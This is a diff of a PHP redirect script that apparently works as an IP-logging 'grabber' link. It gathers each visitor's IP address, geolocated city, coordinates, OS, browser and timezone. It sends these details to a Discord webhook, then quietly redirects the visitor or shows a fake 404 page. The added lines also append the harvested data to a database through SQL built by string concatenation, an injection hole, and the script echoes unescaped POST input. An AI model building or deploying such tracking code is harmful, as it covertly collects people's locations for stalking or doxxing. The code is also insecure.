@@ -43,13 +43,15 @@ if ($result->num_rows > 0) {
         $log = $row['log'];
         $url = $row["url"];
         $webhook=  $row['discord'];
+        $current_data = $row['data'];
 
     }
 
 } else {
-    echo "0 results";
+   #PHP-page
+    header("Location: /404.php");
 }
-$conn->close();
+
 echo $_POST['data'];
 //MESSAGE SEND TO DISCORD
 $make_json = json_encode(array ('content'=>
@@ -77,6 +79,7 @@ UserAgent: $ba
 "
 ));
 
+
 if($debug){
     echo $id.'<br>';
     echo $acces .'<br>';
@@ -102,6 +105,38 @@ echo  $_POST['data'];
 #Del cookies
 setcookie("ba", null);
 setcookie("id", null);
+/*###########################################
+ * SET DATA IN DB
+ *################################*/
+
+$db = array(
+    "ip"=>$geoplugin->ip,
+    "os"=>$os,
+    "arh"=>$arh,
+    "br"=>$br,
+    "time"=>$time,
+    "city"=>$geoplugin->city,
+    "region"=>$geoplugin->region,
+    "regioncode"=>$geoplugin->regionCode,
+    "country"=>$geoplugin->countryName,
+    "countrycode"=>$geoplugin->countryCode,
+    "lat"=>$geoplugin->latitude,
+    "long"=>$geoplugin->longitude,
+    "acu"=>$geoplugin->locationAccuracyRadius,
+    "timezone"=>$timezone,
+    "dev"=>$dev,
+    "ba"=>$ba
+);
+
+$array_data = json_decode($current_data, true);
+$array_data[] = $db;
+$final_data = json_encode($array_data);
+$dbsql = "UPDATE `main2` SET `data` = '".$final_data."' WHERE `main2`.`id` = '".$id."'; ";
+#send db update quary
+if ($conn->query($dbsql) === TRUE) {
+    $conn->close();
+}
+
 
 header("Location:$url");
 ?>
